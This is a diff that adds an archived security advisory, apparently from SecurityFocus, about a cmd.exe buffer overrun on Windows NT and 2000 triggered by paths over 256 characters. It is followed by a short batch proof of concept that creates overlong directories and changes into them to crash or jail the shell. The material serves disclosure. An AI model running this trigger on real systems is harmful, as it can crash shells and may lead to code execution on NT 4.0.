@@ -1,0 +1,16 @@
+source: http://www.securityfocus.com/bid/6829/info
+
+The Windows NT and 2000 command prompt (cmd.exe) does not properly handle paths containing more than 256 characters. If the cd (change directory) command is used to change to a subdirectory resulting in a path with more than 256 characters, a buffer is overrun. This could lead to cmd.exe failing with the possibility of code execution on Windows NT 4.0 systems. Automated scripts that traverse and preform operations on arbitrary directories are particularly vulnerable.
+
+On Windows 2000 systems, cmd.exe will become 'jailed' in the directory. 
+
+@echo off
+SET A=AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+SET B=BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB
+mkdir \\?\c:\%A%
+mkdir \\?\c:\%A%\%A%
+mkdir \\?\c:\%A%\%B%c:
+cd cd AAAAAAAAAAAA*
+cd AAAAAAAAAAAA*
+cd BBBBBBBBBBBB*
+cd .. 
